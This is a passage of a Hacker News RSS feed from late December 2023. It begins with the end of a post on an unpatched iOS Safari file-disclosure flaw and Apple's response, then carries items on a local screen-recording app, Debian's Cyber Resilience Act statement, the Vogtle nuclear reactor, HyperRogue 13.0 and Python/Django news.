  <li>SMS/call_history.db: which contains the SMS history of the user.</li>
</ul>

<p>Or maybe:</p>
<ul>
  <li>History.plist: which contains the browsing history of the user.</li>
  <li>Cookies.plist: which contains the browser’s cookies – including authentication cookies, which an attacker can re-use once they are stolen.</li>
</ul>

<hr>

<p>After contacting Apple to see whether they intended to patch this, the response was quite short: <code>If in the future you are able to reproduce this issue using a different device that's running iOS 17 or later, please let us know.</code></p>

<p>This raises some interesting questions. First off, does it imply that Apple does not patch vulnerabilities in older versions of iOS unless they may used to root/jailbreak the iPhone, or are known to be actively being either mass-exploited or exploited by some nation-state?</p>

<p>A <a href="https://github.com/skysafe/reblog/tree/main/cve-2023-45866">new exploit targeting the iOS</a> (among other OS’) Bluetooth stack has also been <a href="https://support.apple.com/en-us/HT214035">left unpatched by Apple in all versions except iOS 17</a>.</p>

<p>If I was an exploit vendor, I would be paying very close attention to vulnerabilities fixed in iOS 17, and seeing whether they work on previous (supported) iOS versions. Not every target has the newest Apple device, and minimal amount of surveillance may save the vendor from burning a 0day on a target that is using a slightly older device.</p>

<hr>

<p>Note: I haven’t tested this against older (supported) MacOS versions, but it’s definitely possible that Safari is exploitable here, too.</p>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Rem: Remember Everything (open source) (277 pts)]]></title>
            <link>https://github.com/jasonjmcghee/rem</link>
            <guid>38787892</guid>
            <pubDate>Wed, 27 Dec 2023 22:56:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jasonjmcghee/rem">https://github.com/jasonjmcghee/rem</a>, See on <a href="https://news.ycombinator.com/item?id=38787892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/jasonjmcghee/rem/blob/main/rem/Assets.xcassets/AppIcon.appiconset/AppIcon128x128@2x.png"><img src="https://github.com/jasonjmcghee/rem/raw/main/rem/Assets.xcassets/AppIcon.appiconset/AppIcon128x128@2x.png" width="24"></a> rem</h2>
<p dir="auto">🧠 Remember everything.</p>
<a href="https://www.loom.com/share/091a48b318f04f22bdada62716298948" rel="nofollow">
  <img src="https://camo.githubusercontent.com/c52c9016b51ed5770681ad7189b3353b4a82508d9fdd0845852b99b4a9935fdc/68747470733a2f2f63646e2e6c6f6f6d2e636f6d2f73657373696f6e732f7468756d626e61696c732f30393161343862333138663034663232626461646136323731363239383934382d776974682d706c61792e676966" data-animated-image="" data-canonical-src="https://cdn.loom.com/sessions/thumbnails/091a48b318f04f22bdada62716298948-with-play.gif">
</a>
<p dir="auto">An open source approach to locally record everything you view on your Apple Silicon computer.</p>
<p dir="auto"><em>Note: Only tested on Apple Silicon, and the release is Apple Silicon.</em></p>
<p dir="auto">I think the idea of recording everything you see has the potential to change how we interact
with our computers, and believe it should be open source.</p>
<p dir="auto">Also, from a privacy / security perspective, this is like... pretty scary stuff, and I want the code open
so we know for certain that nothing is leaving your laptop. Even logging to Sentry has the potential to
leak private info.</p>
<p dir="auto">This is 100% local. Please, read the code yourself.</p>
<h3 tabindex="-1" dir="auto">This is crazy alpha version</h3>
<p dir="auto">I wrote this in a couple days over the holidays, and if there's one takeaway, it's that I'm a
complete novice at Swift.</p>
<h2 tabindex="-1" dir="auto">Getting Started</h2>
<ul dir="auto">
<li>Launch the app</li>
<li>Click the brain</li>
<li>Click "Start Remembering"</li>
<li>Grant it access to "Screen Recording" i.e. take screenshots every 2 seconds</li>
<li>Click "Open timeline" or "Cmd + Scroll Up" to open the timeline view
<ul dir="auto">
<li>Scroll left or right to move in time</li>
</ul>
</li>
<li>Click "Search" to open the search view
<ul dir="auto">
<li>Search your history and click on a thumbnail to go there in the timeline</li>
</ul>
</li>
<li>In timeline, give Live Text a second and then you can select text</li>
<li>Click "Copy Recent Context" to grab a prompt for interacting with an LLM with what you've seen recently as context</li>
<li>Click "Purge All Data" to delete everything (useful if something breaks)</li>
</ul>
<h2 tabindex="-1" dir="auto">Current supports:</h2>
<ul dir="auto">
<li>Going back in time (full-screen scrubber of everything you've viewed)</li>
<li>Copy text from back in time</li>
<li>Search everything you've viewed</li>
<li>Easily grab recent context for use with LLMs</li>
</ul>
<h2 tabindex="-1" dir="auto">Things I'd love to add:</h2>
<ul dir="auto">
<li>Natural language search / agent interaction via updating local vector embedding
<ul dir="auto">
<li><a href="https://github.com/jasonjmcghee/portable-hnsw">I've also been exploring novel approaches to vector dbs</a></li>
</ul>
</li>
<li>Multi-monitor support</li>
</ul>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Debian Statement on the Cyber Resilience Act (171 pts)]]></title>
            <link>https://lwn.net/Articles/956187/</link>
            <guid>38787005</guid>
            <pubDate>Wed, 27 Dec 2023 21:32:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/Articles/956187/">https://lwn.net/Articles/956187/</a>, See on <a href="https://news.ycombinator.com/item?id=38787005">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
The Debian project has <a href="https://www.debian.org/vote/2023/vote_002">completed a
general-resolution vote</a>, adopting a statement expressing concern about
the Cyber Resilience Act (CRA) pending in the European Union.
</p><blockquote>
	Even if only "commercial activities" are in the scope of CRA, the
	Free Software community - and as a consequence, everybody - will
	lose a lot of small projects. CRA will force many small enterprises
	and most probably all self employed developers out of business
	because they simply cannot fulfill the requirements imposed by
	CRA. Debian and other Linux distributions depend on their work. If
	accepted as it is, CRA will undermine not only an established
	community but also a thriving market. CRA needs an exemption for
	small businesses and, at the very least, solo-entrepreneurs
</blockquote><br clear="all"><hr><p>
           (<a href="https://lwn.net/Login/?target=/Articles/956187/">Log in</a> to post comments)
           </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[3D Map of Shinjuku Station in Three.js (709 pts)]]></title>
            <link>https://satoshi7190.github.io/Shinjuku-indoor-threejs-demo/</link>
            <guid>38786581</guid>
            <pubDate>Wed, 27 Dec 2023 20:50:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://satoshi7190.github.io/Shinjuku-indoor-threejs-demo/">https://satoshi7190.github.io/Shinjuku-indoor-threejs-demo/</a>, See on <a href="https://news.ycombinator.com/item?id=38786581">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p><span>「新宿駅周辺屋内地図データ」（国土交通省）（<a href="https://www.geospatial.jp/ckan/dataset/mlit-indoor-shinjuku-r2" ,="" target="_blank" rel="noopener noreferrer">https://www.geospatial.jp/ckan/dataset/mlit-indoor-shinjuku-r2</a>）を加工して作成</span>
        </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[First new U.S. nuclear reactor since 2016 is now in operation (763 pts)]]></title>
            <link>https://www.eia.gov/todayinenergy/detail.php?id=61106</link>
            <guid>38785468</guid>
            <pubDate>Wed, 27 Dec 2023 19:19:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eia.gov/todayinenergy/detail.php?id=61106">https://www.eia.gov/todayinenergy/detail.php?id=61106</a>, See on <a href="https://news.ycombinator.com/item?id=38785468">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <p><span>December 26, 2023</span></p>
                                    










<p>From December 18 to January 1, <em>Today in Energy</em> will feature some of our favorite articles from 2023. Today’s article was originally published on August 1.</p>

<p><img src="https://www.eia.gov/todayinenergy/images/2023.08.01/main.svg" alt="U.S. nuclear power capacity additions"></p><p><span>
<strong>Data source: </strong>U.S. Energy Information Administration, <a href="https://www.eia.gov/electricity/data/eia860m/"><em>Preliminary Monthly Electric Generator Inventory</em></a>, and Georgia Power press release<br><strong>Note: </strong>Data excludes capacity built and retired before 2002.
	
</span></p>
<hr>


<p>A new reactor at Georgia’s Vogtle nuclear power plant is now in commercial operation, according to an <a href="https://www.georgiapower.com/company/news-center/2023-articles/vogtle-unit-3-goes-into-operation.html">announcement from Georgia Power</a>, one of the plant’s owners. It is the first new nuclear reactor to start up in the United States since the Tennessee Valley Authority’s Watts Bar 2 was commissioned in 2016.    </p>
	
     
	
<p>The new 1,114 megawatt (MW) Unit 3 reactor joins two existing reactors at Plant Vogtle, which is jointly owned by Georgia Power and three other electric utility companies. The plant’s first two reactors, with a combined 2,430 MW of <a href="https://www.eia.gov/tools/glossary/index.php?id=Generator%20nameplate%20capacity">nameplate capacity</a>, came online in the late 1980s. Georgia Power expects another similar-sized fourth reactor, Vogtle Unit 4, <a href="https://www.georgiapower.com/company/news-center/2023-articles/hot-functional-testing-completed-for-vogtle-unit-4.html#:~:text=Unit%204%20is%20projected%20to,or%20the%20first%20quarter%202024.">to begin operation</a> sometime between November 2023 and March 2024. The two new reactors will make Plant Vogtle the largest nuclear power plant in the country, surpassing the 4,210 MW Palo Verde plant in Arizona. </p>

<p>Construction at the two new reactor sites <a href="https://www.augustachronicle.com/story/business/2009/11/22/stub-984/14385703007/">began in 2009</a>. Originally expected to cost $14 billion and begin commercial operation in 2016 (Vogtle 3) and 2017 (Vogtle 4), the project ran into significant construction delays and cost overruns. The total cost of the project is now <a href="https://apnews.com/article/georgia-power-co-southern-climate-and-environment-business-3b1d6c65353c6a65b1ccfddede753ab7">estimated at more than $30 billion</a>. </p>

<p>Both Vogtle Units 3 and 4 use a new reactor design, the Westinghouse <a href="https://www.westinghousenuclear.com/energy-systems/ap1000-pwr">AP1000</a>. This next generation advanced reactor has a smaller footprint and simpler design than previous generation reactor technologies. It also features robust <a href="https://www.westinghousenuclear.com/energy-systems/ap1000-pwr/safety/passive-safety-systems">passive safety systems</a> that can shut down the reactor without any operator action or external power source. Units 3 and 4 are the first U.S. deployment of the AP1000 Generation III+ reactor. Two other Westinghouse AP1000 reactors were planned for a nuclear power plant in South Carolina, but <a href="https://www.eia.gov/todayinenergy/detail.php?id=32472#:~:text=South%20Carolina%20Electric%20%26%20Gas%20Company,Summer%20nuclear%20power%20plant.">construction was halted</a> in 2017. </p>

<p>The <a href="https://www.energy.gov/management/december-23-1957-shippingport">first commercial nuclear power reactor</a> in the United States came online in December 1957 in Shippingport, Pennsylvania. Most U.S. nuclear reactors were <a href="https://www.eia.gov/todayinenergy/detail.php?id=30972#:~:text=Of%20the%2099%20gigawatts%20(GW,online%20between%201970%20and%201990.">built in the 20-year period from 1970 to 1990</a>. Prior to Vogtle Unit 3, the last nuclear reactor to start in the United States was <a href="https://www.eia.gov/todayinenergy/detail.php?id=26652">Watts Bar Unit 2</a> in Tennessee. Construction on Watts Bar 2 began in 1973 but was suspended in 1985. Work resumed in 2007, and the reactor came online in 2016. </p>

<p>With 95,881 MW of nuclear power capacity at 93 operating commercial reactors, the United States has more nuclear capacity than any other country. Nuclear power plants produce nearly 20% of the country’s electricity. </p>

<p>Although a number of nuclear reactors have retired in recent years, there has been <a href="https://www.economist.com/united-states/2023/06/25/america-aims-for-nuclear-power-renaissance">interest</a> in nuclear power as an energy resource to help reduce the carbon footprint of the U.S. electric power sector. Generation from nuclear reactors doesn’t produce CO<sub>2</sub> emissions and can provide essential baseload power that would otherwise largely come from coal- and natural gas-fired plants. </p>

<p>Recent legislation, such as the Bipartisan Infrastructure Law and the Inflation Reduction Act, supports U.S. nuclear energy as part of a clean energy, zero-carbon generating portfolio.</p>
	
<p><strong>Principal contributors: </strong>Elesia Fasching, Tyler Hodge, Slade Johnson</p>
	





                                                                        
              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Web Development History – Internet history for the technically curious (113 pts)]]></title>
            <link>https://webdevelopmenthistory.com/index/</link>
            <guid>38785317</guid>
            <pubDate>Wed, 27 Dec 2023 19:04:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webdevelopmenthistory.com/index/">https://webdevelopmenthistory.com/index/</a>, See on <a href="https://news.ycombinator.com/item?id=38785317">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="container">

		<p><a href="#content">Skip to content</a></p><!-- .skip-link -->

		<header id="header">
			<div id="branding">

									<!-- Site title and logo -->
		<a href="https://webdevelopmenthistory.com/"><p><img src="https://webdevelopmenthistory.com/wp-content/uploads/2020/11/wdh_logo2.png" alt="Web Development History"></p>
		<div>
				<p id="site-title">Web Development History</p>				<p id="site-description">Internet history for the technically curious</p>			</div>
		</a>
		
						
	<nav id="menu-primary" aria-label="Primary Menu">

		<!-- Mobile menu toggle button (hamburger/x icon) -->
		

		<ul id="menu-primary-items" aria-expanded="false"><li id="menu-item-50"><a href="https://webdevelopmenthistory.com/">Home</a></li>
<li id="menu-item-2137"><a href="https://webdevelopmenthistory.com/about/">About</a></li>
<li id="menu-item-2341"><a href="https://webdevelopmenthistory.com/index/" aria-current="page">Index</a></li>
<li id="menu-item-2946"><a href="https://webdevelopmenthistory.com/timeline/">Timeline</a></li>
</ul>
	</nav><!-- #menu-primary -->

	
					</div><!-- #branding -->
		</header><!-- #header -->

<div id="main">
			
			
			<main id="content">

				
				
					
						
						<article id="post-2339" class="page">

	
		<header>
        				
		</header><!-- .entry-header -->

		<div itemprop="text">
			
<p>This page is a topical index of WDH posts. There is also a <a href="https://webdevelopmenthistory.com/timeline/">chronological timeline</a>, if you prefer that approach. </p>



<h2>WWW Beginnings</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1990-programming-the-world-wide-web/">1990: Programming the World Wide Web</a></li><li><a href="https://webdevelopmenthistory.com/1991-tim-berners-lee-trys-to-convert-the-hypertext-faithful/">1991: Tim Berners-Lee Tries to Convert the Hypertext Faithful</a></li><li><a href="https://webdevelopmenthistory.com/1992-web-vs-gopher/">1992: The Web vs Gopher, and the First External Browsers</a></li><li><a href="https://webdevelopmenthistory.com/1993-mosaic-launches-and-the-web-is-set-free/">1993: Mosaic Launches and the Web is Set Free</a></li></ul>



<h2>Server-Side</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1993-cgi-scripts-and-early-server-side-web-programming/">1993: CGI Scripts and Early Server-Side Web Programming</a></li><li><a href="https://webdevelopmenthistory.com/1994-perl-yahoo/">1994: How Perl Became the Foundation of Yahoo</a></li><li><a href="https://webdevelopmenthistory.com/1995-php-quietly-launches-as-a-cgi-scripts-toolset/">1995: PHP Quietly Launches as a CGI Scripts Toolset</a></li><li><a href="https://webdevelopmenthistory.com/1995-apache-microsoft-iis-web-server-market/">1995: Apache and Microsoft IIS Shake Up the Web Server Market</a></li><li><a href="https://webdevelopmenthistory.com/1995-mysql-lamp-stack/">1995: MySQL Arrives, Completing the LAMP Stack</a></li></ul>



<h2>Client-Side</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1995-the-birth-of-javascript/">1995: The Birth of JavaScript</a></li><li><a href="https://webdevelopmenthistory.com/1996-javascript-annoyances-and-meeting-the-dom/">1996: JavaScript Annoyances and Meeting the DOM</a></li><li><a href="https://webdevelopmenthistory.com/1996-flash-css-web-design/">1996: Flash and CSS Bring Design to the Web</a></li><li><a href="https://webdevelopmenthistory.com/1997-javascript-apps-dynamic-web/">1997: JavaScript Grows Up and Developers Push the Boundaries</a></li><li><a href="https://webdevelopmenthistory.com/1997-the-year-of-dhtml/">1997: The Year of DHTML</a></li></ul>



<h2>Browser Wars 1</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1996-netscape-lays-the-groundwork-for-web-applications/">1996: Netscape Lays the Groundwork For Web Applications</a></li><li><a href="https://webdevelopmenthistory.com/1996-microsoft-activates-the-internet-with-activex-jscript/">1996: Microsoft Activates the Internet With ActiveX &amp; JScript</a></li><li><a href="https://webdevelopmenthistory.com/1997-netscape-crossware-vs-the-windows-web/">1997: Netscape Crossware vs the Windows Web</a></li><li><a href="https://webdevelopmenthistory.com/1998-mozilla-w3c-dom-wasp/">1998: Open Season with Mozilla, W3C’s DOM, and WaSP</a></li><li><a href="https://webdevelopmenthistory.com/1999-the-fall-of-netscape-and-the-rise-of-mozilla/">1999: The Fall of Netscape and the Rise of Mozilla</a></li></ul>



<h2>Pre-History</h2>



<ul><li><a href="https://webdevelopmenthistory.com/1968-the-mother-of-all-demos/">1968: The Mother of All Demos</a></li><li><a href="https://webdevelopmenthistory.com/1969-building-the-on-line-system/">1969: Building the oN-Line System</a></li><li><a href="https://webdevelopmenthistory.com/the-first-web-developer/">The Time I Met Bill English</a></li></ul>
					</div><!-- .entry-content -->

		<!-- .entry-footer -->

	
</article><!-- .entry -->

						
							
						
					
					
				
			</main><!-- #content -->

			
			
	<!-- #sidebar-primary -->

		</div><!-- #main -->



		


<!-- #footer -->

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HyperRogue, a open-source non-Euclidean roguelike: new weapons (148 pts)]]></title>
            <link>http://zenorogue.blogspot.com/2023/12/hyperrogue-130.html</link>
            <guid>38784817</guid>
            <pubDate>Wed, 27 Dec 2023 18:20:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://zenorogue.blogspot.com/2023/12/hyperrogue-130.html">http://zenorogue.blogspot.com/2023/12/hyperrogue-130.html</a>, See on <a href="https://news.ycombinator.com/item?id=38784817">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-5726842474839147375" itemprop="description articleBody"><p>
HyperRogue version 13.0 is released on <a href="https://store.steampowered.com/app/342610/HyperRogue/">Steam</a> and 
<a href="https://zenorogue.itch.io/hyperrogue">itch.io</a>!
</p><p>
Again, it was quite a long time since the last major update (12.0, from 2021). Of course, the work never
stopped -- improvements were continuously added to the game, so if you were following HyperRogue closely, you have seen these. For less active followers, here is a summary of the most interesting new stuff.

</p><h2>Dangerous to go in a line. Take a Crossbow!</h2><p>
Many roguelikes ensure their longevity by providing ways many different ways to play the game. This is done both by having many possible
inventory-based builds (as reflected in HyperRogue's <i>Orb Strategy Mode</i>), but also by giving a choice of playing multiple kinds of characters,
with different strengths and weaknesses; for example, the five different characters in <a href="https://zenorogue.itch.io/hydra-slayer"><i>Hydra Slayer</i></a>, or 27 different species in
<i>Dungeon Crawl Stone Soup</i>, further augmented by specialization and deity choices. However, this kind of specialization often relies on changing the damage produced
by various kinds of attacks -- HyperRogue, with its focus on geometry and one-hit combat, was relatively lacking in this area. Could we still have something similar while still maintaining the focus on geometry?
</p><center>
<a href="https://roguetemple.com/z/hyper/crossbow.png">
<img src="https://roguetemple.com/z/hyper/crossbow-thumb.png"></a>
</center><p>

HyperRogue 13.0 includes an option to play the game with another weapon: a <b>crossbow</b> instead of the classic <b>blade</b>! A classic traditional roguelike strategy is: when attacked by an overwhelming force of multiple enemies, move into a corridor, forcing them to attack one by one; HyperRogue combines this idea with hyperbolic geometry, making this strategy work even in open space, due to the geometry of the world itself. But why use your blade to attack them one by one, when you could also have a penetrating attack that kills the whole straight line of enemies in a single shot? As a counterbalance, the crossbow takes several turns to reload.
</p><p>

Rethinking the concept of a <i>straight line</i> was fundamental for the development of non-Euclidean geometries; in HyperRogue, it becomes even more sophisticated, because this geometric concept needs to be interpreted in terms of grid tactics. Some roguelikes let you fire your ranged attack at any point, while in some, they work a bit like a Queen in chess: ranged attacks can be aimed only cardinally or diagonally. And in some, it depends on the type of ranged attack used. So, the crossbow could actually be a few different weapons. A crossbow which shoots only in "bull lines" is less universal than one that can shoot along any tile-based approximation of a hyperbolic straight line, but it takes less time to reload. There is also a third option, but we will just let you see for yourself.

</p><h2>New modes, geometries, and land structures</h2><p>

Of course, while the character in HyperRogue does not change that much, neither by player's customization nor by gaining in-world experience, HyperRogue focuses on changing the world itself, or the rules of the game. There is not much new in terms of whole new modes -- unless we count new options for the real-time multiplayer mode of HyperRogue, such as PvP or split screen or using dual focus projections -- but one
of the things that can be changed is the geometry of the world... or, at least, the tiling.

</p><center>
<a href="https://roguetemple.com/z/hyper/geo-hat.png">
<img src="https://roguetemple.com/z/hyper/geo-hat-thumb.png"></a>
</center>

<p>

Probably the most popular mathematical discovery of 2023 was the discovery of <a href="https://arxiv.org/abs/2303.10798">hat</a>
and <a href="https://arxiv.org/abs/2305.17743">Spectre</a> tiles, which can tile the whole Euclidean plane by themselves, but only in non-periodic ways. Soon after this discovery, this tiling became available in HyperRogue.

</p><center>
<a href="https://roguetemple.com/z/hyper/geo-spectre.png">
<img src="https://roguetemple.com/z/hyper/geo-spectre-thumb.png"></a>
</center><p>

While the rules of HyperRogue are specially designed for hyperbolic geometry, you can e.g. play the <i>Minefield</i> land in the Hat/Spectre tiling, to get a more original variation on Minesweeper. There are more options to customize the geometry of the world -- for example, the <a href="https://github.com/zenorogue/hyperrogue/tree/master/tessellations/sample">format to specify arbitrary periodic or some horocycle-based 2D tilings</a> has been extended, three-dimensional geometries no longer include only regular hyperbolic and spherical honeycombs but their cells can be subdivided, and there is an option to play only on a finite portion of an infinite geometry. These are likely less balanced, but still cool for experimentation or visualization.

</p><center>
<a href="https://roguetemple.com/z/hyper/horodisks.png">
<img src="https://roguetemple.com/z/hyper/horodisks-thumb.png"></a>
</center><p>

If you do not want to change the geometry of the world, you can still change how it is structured... New options shown in the images above replace the usual HyperRogue land structure (lands separated mostly by hyperbolic straight lines) with alternative ones. In one, every land is bounded by a horocycle (a shape existing only in non-Euclidean geometry that looks a bit like a cirle but is actually infinite)...


</p><center>
<a href="https://roguetemple.com/z/hyper/ideal-voronoi.png">
<img src="https://roguetemple.com/z/hyper/ideal-voronoi-thumb.png"></a>
</center>

<p>

In another, the hyperbolic plane is subdivided into lands like in a Voronoi tessellation -- some points are chosen as centers, every tile gets assigned to a land depending on which center is closest to it -- but where the centers are very rare... <a href="https://arxiv.org/abs/2303.16831">so rare that they are infinitely away</a>.

</p><h2>Visualization</h2>

<center><iframe width="400" height="225" data-thumbnail-src="https://i.ytimg.com/vi/Rhjv_PazzZE/0.jpg" src="https://www.youtube.com/embed/Rhjv_PazzZE?feature=player_embedded" frameborder="0" allowfullscreen=""></iframe></center>

<p>

HyperRogue is not only about great roguelike gameplay, but also about non-Euclidean visualization! Since 2019, we could play in <a href="http://zenorogue.blogspot.com/2019/09/hyperrogue-112-thurston-geometries-free.html">Thurston geometries</a>; however, roguelikes were designed to be played in 2D, and most people find them less fun when you can move in three dimensions. Also <a href="http://zenorogue.blogspot.com/2019/06/hyperrogue-version-11.html">since 2019</a> we could play the usual 2D game of HyperRogue, but view it in full 3D. However, this 3D view was restricted to use the 3D version of that 2D geometry: hyperbolic plane in three-dimensional hyperbolic space, sphere in three-dimensional spherical space, etc. Now, the HyperRogue engine features a large list of embeddings. Unfortunately, for the standard "hyperbolic soccerball tiling" that HyperRogue plays best in, only 3-dimensional hyperbolic space, and the "product space" where the third dimension is added in the Euclidean way, works. However, a sphere can be embedded in 3D Euclidean and hyperbolic geometry, and for the Euclidean plane, especially when wrapped in flat torus, there are lots of options -- including all Thurston geometries, and more! These are explored in <a href="https://www.youtube.com/watch?v=Rhjv_PazzZE">this video</a>.

</p><center><iframe width="400" height="225" data-thumbnail-src="https://i.ytimg.com/vi/yqUv2JO2BCs/0.jpg" src="https://www.youtube.com/embed/yqUv2JO2BCs?feature=player_embedded" frameborder="0" allowfullscreen=""></iframe></center>

<p>

Another new thing is an option to create a world with portals between different geometries; we have shown this in <a href="https://www.youtube.com/watch?v=yqUv2JO2BCs">this video with over 1M views</a>, and the HyperRogue engine can be used to create spaces likes this, by placing bricks in different geometries like in Minecraft, connecting them with portals, and exploring them in VR. There is no real gameplay in these worlds, but hopefully we inspire other game developers to try new stuff!

</p><h2>Have fun!</h2><p>
On top of that, there was of course a large number of minor bugfixes and improvements. The Android version is not updated yet, but hopefully should be updated soon too.
</p><p>
To get updates on HyperRogue and our other projects faster, join <a href="https://discord.gg/8G44XkR">the HyperRogue discord server</a> or <a href="https://roguetemple.com/z/hyper/faq.php">other discussion places</a>, or follow us on <a href="https://mathstodon.xyz/@zenorogue">Mathstodon</a> or <a href="https://twitter.com/ZenoRogue/">X/Twitter</a> or <a href="https://www.youtube.com/@ZenoRogue">YouTube</a>. Also wishlist <a href="https://store.steampowered.com/app/2271110/RogueViz_Collection/">RogueViz Collection on Steam</a> for a collection of smaller non-Euclidean games. Have fun, and good luck! 
</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What's up Python? Epic CPython commit, Django 5 and 2FA for PyPI (176 pts)]]></title>
            <link>https://www.bitecode.dev/p/whats-up-python-epic-cpython-commit</link>
            <guid>38784797</guid>
            <pubDate>Wed, 27 Dec 2023 18:18:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bitecode.dev/p/whats-up-python-epic-cpython-commit">https://www.bitecode.dev/p/whats-up-python-epic-cpython-commit</a>, See on <a href="https://news.ycombinator.com/item?id=38784797">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><ul><li><p><em>The best CPython commit of 2023</em></p></li><li><p><em>Django version 5</em></p></li><li><p><em>2FA gets mandatory on pypi for 2024</em></p></li><li><p><em>A proposal to clean up the logging module API</em></p></li></ul><p><span>Performance has been a busy topic this year, and&nbsp;</span><a href="https://www.bitecode.dev/p/whats-up-python-new-args-syntax-subinterpreters" rel="">we mentioned last month</a><span>&nbsp;the future JIT that was planned for 3.13.</span></p><p><span>With change&nbsp;</span><a href="https://github.com/python/cpython/pull/113465" rel="">GH-113464</a><span>, Brandt Bucher offers the whole community the Xmas gift of the first JIT related merge proposal.</span></p><p>Even if you don't intend to read the code, I strongly encourage you to read the commit message as it's made with a cheerful holiday spirit.</p><p><span>Since 3.13 alpha 2 is&nbsp;</span><a href="https://pythoninsider.blogspot.com/2023/11/python-3130-alpha-2-is-now-available.html" rel="">out of the oven</a><span>, it's all well in sync.</span></p><p><span>It's also a good time to remind you once again that 3.13 </span><a href="https://docs.python.org/dev/whatsnew/3.12.html#pending-removal-in-python-3-13" rel="">will deprecate a lot of things</a><span>, although there has been&nbsp;</span><a href="https://vstinner.github.io/remove-c-api-funcs-313.html" rel="">some push back on that side</a><span>, as people reminded Victor Stinner he is, as usual, a bit too enthusiastic about deleting stuff.</span></p><p><span>And since I'm on the topic,&nbsp;</span><a href="https://www.python.org/downloads/release/python-3117/" rel="">3.11.7</a><span>&nbsp;and&nbsp;</span><a href="https://www.python.org/downloads/release/python-3121/" rel="">3.12.1</a><span>&nbsp;were also released. Those are bug fixes of course, but if you don't follow my advice to&nbsp;</span><a href="https://www.bitecode.dev/i/112502596/first-decide-on-the-version-of-python-you-need" rel="">stay one version behind</a><span>, at least I hope you waited until 3.12.1 because 3.x.0 are always full of holes.</span></p><p><span>Since you know now that&nbsp;</span><a href="https://www.bitecode.dev/p/beginners-should-use-django-not-flask" rel="">beginners should use Django and not Flask</a><span>, maybe you will be very interested that the latest release of the web framework&nbsp;</span><a href="https://docs.djangoproject.com/en/5.0/releases/5.0/" rel="">dropped this month</a><span>. </span></p><p>On the menu:</p><ul><li><p>The ORM used to allow dynamic default values for any field, but expected a Python function to provide them. We can now declare that the database should generate them. E.G:</p></li></ul><pre><code><code>from django.db import models
from django.db.models.functions import Now, Pi


class MyModel(models.Model):
    age = models.IntegerField(db_default=18)
    created = models.DateTimeField(db_default=Now())
    circumference = models.FloatField(db_default=2 * Pi())</code></code></pre><ul><li><p>Following in the same trend, the ORM now has a way for you to define fields generated on the database side, such as a field made from other fields. E.G:</p></li></ul><pre><code><code>from django.db import models
from django.db.models import F


class Square(models.Model):
    side = models.IntegerField()
    area = models.GeneratedField(
        expression=F("side") * F("side"),
        output_field=models.BigIntegerField(),
        db_persist=True,
    )</code></code></pre><ul><li><p>Templates for form rendering have been simplified: you can now decide the granularity of what part of the form you want to customize, using field groups.</p></li><li><p><code>UUIDField</code><span>&nbsp;uses a correct UUID column on MariaDB 10.7.</span></p></li><li><p>Django now supports oracledb version 1.3.2 or higher, but cx_Oracle support is deprecated.</p></li><li><p>The asynchronous work in progress continues, with many more features supporting it, such as authentication or view decorators.</p></li></ul><p>Django 5 drops support for Python 3.9 and bellow, though, so if you use those, stay on the 4.2.X series.</p><p><span>New users of pypi had recently to activate 2FA to be able to manage their account. This test has proven successful, and given t</span><a href="https://blog.pypi.org/posts/2023-12-04-account-takeover/" rel="">he regular attacks on pypi</a><span>,&nbsp;</span><a href="https://blog.pypi.org/posts/2023-12-13-2fa-enforcement/" rel="">2FA will be rolled out for&nbsp;</a><strong><a href="https://blog.pypi.org/posts/2023-12-13-2fa-enforcement/" rel="">all users</a></strong><a href="https://blog.pypi.org/posts/2023-12-13-2fa-enforcement/" rel="">&nbsp;in 2024</a><span>.</span></p><p>You have the choice between a security key like a yubikey, or a TOTP code.</p><p>I just tested the procedure, and it took only a few minutes, despite having 4 yubikeys and 2 TOTP apps to configure.</p><p>Very well implemented.</p><p><span>I have a love/hate relationship with the stdlib&nbsp;</span><a href="https://docs.python.org/3/library/logging.html" rel="">logging</a><span>&nbsp;module. On one hand, it means Python ships with a rich, versatile, fully functional logging module out of the box, that is so configurable you can pretty much do anything with it, and it's thread safe by default! It's kinda amazing, and rare enough to state it.</span></p><p>On the other hand, the API is terrible. It's verbose, counterintuitive, has bad default values, and is written in camel Case.</p><p><a href="https://github.com/metaperl/peps/blob/main/peps/pep-8106.rst" rel="">The draft of PEP 8106</a><span>&nbsp;aims to change this very last point, and at least provide a version of logging that would be PEP8 compliant. The idea is not to remove the old API, but at to come up with aliases that don't make you feel like you coding in 1998 Java.</span></p><p><span>So&nbsp;</span><code>logging.basicConfig</code><span>&nbsp;would also be available as&nbsp;</span><code>logging.basic_config</code><span>,&nbsp;</span><code>Logger.setLevel</code><span>&nbsp;would be available also as&nbsp;</span><code>Logger.set_level</code><span>, and so on.</span></p><p><span>The PEP is very bare bone and doesn't have a sponsor yet, so I wouldn't expect it to go very far. Plus, I'm not saying this is the right solution. An&nbsp;</span><code>os.path</code><span>&nbsp;to&nbsp;</span><code>pathlib</code><span>&nbsp;new wrapper module would sit better with me.</span></p><p>But I like the fact it's shaking this tree.</p></div></article></div></div>]]></description>
